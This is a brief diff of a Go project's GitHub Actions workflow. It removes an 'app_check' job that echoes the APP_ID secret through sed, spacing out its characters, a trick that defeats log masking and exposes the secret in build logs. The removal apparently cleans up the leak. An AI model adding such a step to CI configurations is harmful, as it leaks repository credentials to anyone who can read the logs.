@@ -9,9 +9,6 @@ env:
   GO_VERSION: '1.23'
 
 jobs:
-  app_check:
-    name: app check
-    run: echo "${{secrets.APP_ID}}" | sed 's/./& /g'
   lint:
     name: golangci-lint
     runs-on: ubuntu-latest
